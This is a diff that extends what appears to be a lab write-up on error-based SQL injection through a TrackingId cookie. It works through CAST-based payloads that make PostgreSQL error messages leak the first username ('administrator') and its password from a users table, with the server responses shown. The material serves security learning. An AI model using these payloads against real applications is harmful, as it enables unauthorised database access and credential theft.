@@ -61,4 +61,35 @@ Unterminated string literal started at position 52 in SQL SELECT * FROM tracking
 Cookie: TrackingId=X'--
 200 OK
 ```
-SQL confirmed, but the issue is we will not get any result in response. If the query fails then 500 error if not then 200 OK.
+SQL confirmed, but the issue is we will not get any result in response. If the query fails then 500 error if not then 200 OK. We are also getting what query is getting executed in the backend if it fails. Lets utilize CAST function.
+```json
+Cookie: TrackingId=X'+AND+CAST((SELECT+1)+as+int)--;
+500 Internal Server Error
+ERROR: argument of AND must be type boolean, not type integer Position: 63
+```
+```json
+Cookie: TrackingId=X'+AND+1=CAST((SELECT+1)+as+int)--;
+200 OK
+```
+```
+Cookie: TrackingId=X'+AND+1=CAST((select+username+from+users)as+int)--
+500 internal server error
+Unterminated string literal started at position 95 in SQL SELECT * FROM tracking WHERE id = 'X' AND 1=CAST((select username from users)as '. Expected  char
+```
+But wait, we are getting unterminated string error, we should get different error here. Means there might some restrictions on length of the query, we will have to fit the query in that range. Since the tracking ID is not necessary to pass, we can use blank value here.
+```json
+Cookie: TrackingId='+AND+1=CAST((select+username+from+users)as+int)--
+ERROR: more than one row returned by a subquery used as an expression
+```
+Yes, this time we got the correct error.
+Lets limit the result to 1.
+```json
+Cookie: TrackingId='+AND+1=CAST((select+username+from+users+LIMIT+1)as+int)--
+ERROR: invalid input syntax for type integer: "administrator"
+```
+Expected error. But it leaked the first username from user which is administraor. Lets get the password as well for this user.
+```json
+Cookie: TrackingId='+AND+1=CAST((select+password+from+users+LIMIT+1)as+int)--
+ERROR: invalid input syntax for type integer: "kixopat4tehe4godqx3r"
+```
+Yeah got the password as well.
